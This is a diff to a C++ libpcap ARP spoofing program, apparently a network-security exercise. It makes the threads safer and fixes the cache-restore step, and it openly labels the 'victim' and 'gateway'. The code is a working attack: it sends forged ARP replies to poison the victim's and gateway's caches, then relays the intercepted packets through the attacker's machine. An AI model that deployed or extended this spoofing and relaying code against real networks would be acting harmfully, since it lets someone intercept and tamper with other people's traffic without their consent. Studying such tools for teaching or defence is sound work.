@@ -13,6 +13,7 @@
 #include <vector>
 #include <thread>
 #include <mutex>
+#include <atomic>
 
 
 #pragma pack(push, 1)
@@ -48,7 +49,7 @@ bool arp_infection(pcap_t* dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip
 bool arp_relay(pcap_t* dev, Mac attack_mac, Mac sender_mac,Mac target_mac, Ip sender_ip, Ip target_ip);
 
 extern std::mutex pcap_mutex;
-extern bool running = true;
+atomic<bool> running = true;
 
 int main(int argc, char *argv[]) {
     if ((argc & 1) || (argc < 4)) {
@@ -67,7 +68,9 @@ int main(int argc, char *argv[]) {
     vector<sender_target_mac> send_tar_macs;
     char errbuf[PCAP_ERRBUF_SIZE];
 
-    pcap_t* pcap = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errbuf);
+    //packet snap length를 기존 BUFSIZ(8192)에서 65536으로 증가시켜 큰 패킷도 감지
+    //cpu에 부하 걸리면 to_ms 수치를 높여도 괜찮음
+    pcap_t* pcap = pcap_open_live(interface.c_str(), 65536, 1, 1, errbuf);
     if (pcap == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", interface.c_str(), errbuf);
         return EXIT_FAILURE;
@@ -83,7 +86,6 @@ int main(int argc, char *argv[]) {
     //cout << string(send_tar_ips[0].sender) << endl;
 
     vector<thread> threads;
-
 
     for (int i = 0; i < send_tar_ips.size(); i++) {
         //send arp request
@@ -116,27 +118,30 @@ int main(int argc, char *argv[]) {
         //start relay
         //sender = victim , target = gateway
         //thread
-        threads.push_back(thread([=,&running](){
+        threads.push_back(thread([&, i](){
                 // sender→target capture
-                lock_guard<mutex> lk(pcap_mutex);
-                arp_relay(pcap, attacker_mac, send_tar_macs[i].sender, send_tar_macs[i].target,
-                    send_tar_ips[i].sender, send_tar_ips[i].target);
+                    while (running.load()) {
 
+                    arp_relay(pcap, attacker_mac, send_tar_macs[i].sender, send_tar_macs[i].target,
+                    send_tar_ips[i].sender, send_tar_ips[i].target);
+                    }
         }));
 
     }
 
     cout << "Press key to stop" << "\n";
     getchar();
-    running = false;
+    running.store(false);
+    this_thread::sleep_for(chrono::seconds(10));
 
     for (auto& t : threads) t.join(); //exit thread
+
 
     //recover
     for (int i = 0; i < send_tar_macs.size(); i++) {
         //send normal packet
         if (!arp_infection(pcap, send_tar_macs[i].target, send_tar_macs[i].sender,
-            send_tar_ips[i].sender, send_tar_ips[i].target)) {
+            send_tar_ips[i].target, send_tar_ips[i].sender)) {
             cout << "Failed ARP infection\n";
             return false;
             }
@@ -228,7 +233,7 @@ bool send_arp_request(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip target_ip, Mac& tar
 
 bool arp_infection(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
 
-    EthArpPacket packet;
+    EthArpPacket packet{};
 
     packet.eth_.dmac_ = Mac(string(sender_mac));
     packet.eth_.smac_ = Mac(string(attack_mac));
@@ -246,10 +251,13 @@ bool arp_infection(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Ip sender_ip, I
     packet.arp_.tmac_ = Mac(string(sender_mac));
     packet.arp_.tip_ = htonl(sender_ip);
 
-    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-        return false;
+    {
+        std::lock_guard<std::mutex> lk(pcap_mutex);
+        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+            return false;
+        }
     }
     return true;
 
@@ -261,20 +269,22 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
     struct pcap_pkthdr* header;
 
     const uint8_t* recv_pkt;
-    int res_recv;
+    long long len = 0;
+    u_char* buf = nullptr;
 
     while (running) {
+        {
+            lock_guard<mutex> lk(pcap_mutex);
+            int res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
+            if (res_recv == 0) continue;
+            if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
+                break;
+            }
 
-        res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
-        if (res_recv == 0) continue;
-        if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
-            break;
+            len = header->caplen;
+            buf = new u_char[len]; //동적 할당
+            memcpy(buf, recv_pkt, len);
         }
-
-        long long len = header->caplen;
-        u_char* buf = new u_char[len]; //동적 할당
-        memcpy(buf, recv_pkt, len);
-
         EthHdr* ethhdr = reinterpret_cast<EthHdr*>(buf);
         uint16_t eth_type = ntohs(ethhdr->type());
 
@@ -286,7 +296,8 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
-                    return false;
+                        delete[] buf;
+                        return false;
                     }
             }
         }
@@ -298,12 +309,17 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
                 ethhdr->smac_ = attack_mac;
                 ethhdr->dmac_ = target_mac;
 
-                int res = pcap_sendpacket(pcap, buf, len);
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket failed: %d (%s)\n", res, pcap_geterr(pcap));
-                    delete[] buf;
-                    return false;
+                {
+                    lock_guard<mutex> lk(pcap_mutex);
+                    int res = pcap_sendpacket(pcap, buf, len);
+                    if (res != 0) {
+                        fprintf(stderr, "pcap_sendpacket failed: %d (%s)\n", res, pcap_geterr(pcap));
+                        delete[] buf;
+                        return false;
+                    }
                 }
+
+
             }
         }
         delete[] buf;
